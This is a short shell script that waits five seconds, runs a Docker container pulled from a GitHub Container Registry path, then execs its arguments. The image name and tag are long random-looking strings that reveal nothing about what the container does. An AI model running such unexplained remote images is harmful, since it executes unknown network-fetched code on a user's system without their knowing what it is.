#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitcpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitC0001-of-three

# start the script
exec "$@"
